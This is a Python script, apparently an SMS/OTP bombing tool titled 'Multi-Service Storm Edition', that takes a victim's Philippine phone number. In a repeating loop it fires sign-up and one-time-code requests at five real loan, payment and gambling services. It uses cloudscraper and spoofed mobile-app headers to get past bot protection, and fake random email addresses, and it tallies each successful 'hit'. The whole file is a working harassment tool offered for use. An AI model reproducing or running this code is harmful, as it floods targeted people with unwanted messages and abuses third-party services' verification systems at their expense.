import cloudscraper, time, threading, sys, random
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor

# UI Colors
G, R, Y, B, W = '\033[92m', '\033[91m', '\033[93m', '\033[94m', '\033[0m'

stop_event = threading.Event()
stats_lock = threading.Lock()
stats = {"honey": 0, "casino": 0, "laki": 0, "bayad": 0, "mega": 0}

scraper = cloudscraper.create_scraper(browser={'browser': 'chrome', 'platform': 'android', 'mobile': True})

def get_time():
    return datetime.now().strftime("%H:%M:%S")

def update_stats(key):
    with stats_lock:
        stats[key] += 1

def storm_worker(target):
    honey_headers = {
        'Accept': 'application/json',
        'Content-Type': 'application/json',
        'ismobileapp': 'true',
        'Origin': 'https://honeyloan.ph',
        'Referer': 'https://honeyloan.ph/',
        'x-requested-with': 'com.dyninno.mobileapp.philippines',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 12; M2102J20SG Build/SKQ1.211006.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/147.0.7727.137 Mobile Safari/537.36'
    }

    while not stop_event.is_set():
        # --- 1. HONEYLOAN ---
        try:
            res = scraper.post(
                'https://api.honeyloan.ph/api/client/registration/step-one', 
                json={"grant_type": "password", "phone": target, "is_rights_block_accepted": True}, 
                headers=honey_headers, 
                timeout=10
            )
            if res.status_code in [200, 201]:
                update_stats("honey")
                print(f"[{get_time()}] {G}HONEYLOAN{W}   -> HIT!")
        except: pass

        # --- 2. CASINO PLUS ---
        try:
            p_c = b'\x00\x00\x00\x00\x14\n\x0c63' + target[1:].encode() + b'\x12\x0250\x18\x01'
            res = scraper.post(
                'https://fpms-nt.casinoplus.top/auth/auth.FrontendAuthService/PlayerRegisterRequestCode', 
                data=p_c, 
                headers={'content-type': 'application/grpc-web+proto'}, 
                timeout=10
            )
            if res.status_code == 200:
                update_stats("casino")
                print(f"[{get_time()}] {G}CASINO PLUS{W} -> HIT!")
        except: pass

        # --- 3. LAKIWIN ---
        try:
            res = scraper.post(
                'https://www.lakiwin.com/service/mobile/check', 
                json={"phoneNumber": target, "otpType": "LOGIN_OTP"}, 
                timeout=10
            )
            if res.status_code == 200:
                update_stats("laki")
                print(f"[{get_time()}] {G}LAKIWIN{W}     -> HIT!")
        except: pass

        # --- 4. BAYAD ---
        try:
            res = scraper.post(
                "https://api.online.bayad.com/api/sign-up/otp", 
                json={"mobileNumber": f"+63{target[1:]}", "emailAddress": f"v82_{random.randint(100,999)}@gmail.com"}, 
                timeout=10
            )
            if res.status_code in [200, 201]:
                update_stats("bayad")
                print(f"[{get_time()}] {G}BAYAD{W}       -> HIT!")
        except: pass

        # --- 5. MEGAPERYA ---
        try:
            res = scraper.post(
                'https://services.megaperya.com/lobby/api/v1/auth/otp/generate', 
                json={"mobile_number": target}, 
                timeout=10
            )
            if res.status_code == 200:
                update_stats("mega")
                print(f"[{get_time()}] {G}MEGAPERYA{W}   -> HIT!")
        except: pass

        if not stop_event.is_set():
            print(f"\n[{get_time()}] {Y}Cycle finished. Waiting 2 minutes...{W}\n")
            time.sleep(125)

def main():
    while True:
        stop_event.clear()
        for k in stats: stats[k] = 0
        
        print(f"\n{B}=========================================={W}")
        print(f"{G}       MULTI-SERVICE STORM EDITION        {W}")
        print(f"{B}=========================================={W}")
        print(f"{R}      STOP: PINDUTIN ANG CTRL+C          {W}")
        print(f"{B}=========================================={W}")
        
        target_num = input(f"{Y}[?]{W} Target Number (e.g. 09307012387): ").strip()
        if not target_num or len(target_num) != 11:
            print(f"{R}Invalid number! Use 11-digit format.{W}")
            continue

        print(f"\n{B}[!] Storm active. Initializing multi-endpoint cycle...{W}\n")
        
        executor = ThreadPoolExecutor(max_workers=1)
        try:
            executor.submit(storm_worker, target_num)
            while not stop_event.is_set():
                time.sleep(1)
        except KeyboardInterrupt:
            print(f"\n\n{R}[!] STOPPING WORKERS...{W}")
            stop_event.set()
            executor.shutdown(wait=False)
            
            print(f"\n{Y}=========================================={W}")
            print(f"{G}              STORM SUMMARY               {W}")
            print(f"{Y}=========================================={W}")
            for k, v in stats.items():
                print(f" {W}{k.upper():12}: {G}{v}{W} Hits")
            print(f"{Y}=========================================={W}")
            
        if input(f"\n{Y}[?]{W} Ulitin para sa ibang target? (y/n): ").lower() == 'n':
            break

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        sys.exit()
